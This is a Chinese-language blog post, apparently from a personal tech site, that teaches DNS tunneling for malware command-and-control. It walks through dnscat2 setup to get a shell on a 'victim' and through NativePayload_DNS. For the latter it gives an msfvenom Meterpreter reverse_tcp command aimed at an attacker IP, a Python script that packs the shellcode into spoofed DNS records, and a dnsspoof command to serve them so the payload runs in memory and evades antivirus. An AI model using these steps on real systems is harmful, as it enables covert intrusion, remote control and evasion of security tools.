---
title: 基于常规DNS隧道通信利用
date: 2019-07-01 11:51:24
description: 极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。

---

## DNS Tunnel可以分为直连和中继两种。

直连就是用目标机器直接和指定的目标DNS Server进行UDPsocket套接字连接，这种方式速度快，但致命的弱点就是直接将IP暴露在流量中，且如果客户端指定了信任的DNS解析服务器，那么将会被白名单限制在外。

中继是通过DNS迭代查询实现的中继隧道，生存能力强，隐蔽性更高，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上慢很多。

中继过程中的一个关键点是对DNS缓存机制的规避，因为如果解析的域名在Local DNS 中已经有缓存时，Local DNS 就不会继续发送数据包。所以在构造请求中，每次查询的域名需要不同或者是已过期的。

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx1.png)

# DNSCAT2

DNSCAT2用于通过DNS协议创建恶意软件的命令和控制通道（C＆C）。它由用Ruby编写的服务器和用C编写的客户端组成。

一开始，需要设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址。如下图的设置：

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx2.png)

解析配置完成后，在服务端nc监听下udp的53端口，再回到windows机器ping下ns域名,如果收到回显,证明解析成功。

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx3.png)

接下来，在server端开启隧道：

ruby./dnscat2.rb dnscat.[domain] –no-cache
[domain]是刚设置的ns记录的子域名，–no-cache代表不进行缓存

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx4.png)

我们以相同的方式启动客户端，并看到会话已经建立。

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx5.png)

回到服务端使用shell进行命令控制:

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx6.png)

在客户端抓取流量包可以看到Dnscat2 主要进行了TXT,CNAME,MX查询。

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx7.png)

并且dnscat2客户端没有直接向我的C2服务器发送DNS查询，相反，受害者的系统正在与标准可信DNS服务器进行通信并转发至该域的权威DNS服务器，

正如下捕获的数据包, 受害者的本地DNS服务器正在尝试解析“dnscat.[domain].cn”域中的主机名，

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx8.png)

# NativePayload_DNS

NativePayload_DNS 是利用DNS隧道来传输shellcode，在内存中执行，进行分离免杀，躲避杀软的静态检测。

项目地址
https://github.com/DamonMohammadbagher/NativePayload_DNS

这里对C#脚本使用csc.exe进行编译可执行文件exe：
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out: Dnsbceon.exe NativePayload_DNS.cs

实现原理：
查看c#源代码，具体分以下三步来实现分离式免杀执行shellcode，通过循环遍历请求DNS中的PTR记录，将返回的域名进行拼接提取,最终调用kernel32申请内存执行shellcode。

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx9.png)

首先使用MSF生成shellcode,如下:

```
Msfvenom --platform windows --arch x64 -p windows/x64/met
erpreter/reverse_tcp lhost=10.10.11.134 lport=4444 -f c > /root/payload.txt
```

![img](https://www.yunzhijia.com/microblog/filesvr/5d4413156d67ff04fe362070)

然后将 shellcode 制作成 IP+地址的格式
Ipaddress “{payload}.domain.com”
1.1.1.0 “0xfc0x480x830xe40xf00xe8.1.com”
1.1.1.1 “0xbc0xc80x130xff0x100x08.1.com”
……

这里使用python进行格式化，结果如下:

```
#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-
a = ''
f = open("payload.txt", "rb")
line = f.readlines()[0:]
f.close()
for lines in range(len(line)):
    ipls = '1.1.1.%s' % lines
    shellcode = line[lines].replace(";","").strip().rstrip('"')+".1.com"+'"'
    text = ipls + " " + '"'+ "0x"+shellcode.lstrip('"')
    a += text.replace("\\","0")+"\n"
fn = open("dns.txt", "wb")
fn.write(a)
```

![img](https://www.yunzhijia.com/microblog/filesvr/5d44138f90144e1859abbf23)

在Kali上 使用dnsspoof 创建DNS服务器，并在MSF进行监听
dnsspoof -i eth0 -f dns.txt

![img](https://www.yunzhijia.com/microblog/filesvr/5d4413fe28011f3c5371f1bb)

通过nslookup查询可以查询到对应的shellcode

![img](https://www.yunzhijia.com/microblog/filesvr/5d44140128011f3c5371f1be)

windows执行编译好的文件，由于使用DNS反向解析，速度相对来说较慢，
经过漫长的等待成功弹回meterpreter。

![img](https://www.yunzhijia.com/microblog/filesvr/5d44144332f2ca7e75d544bf)
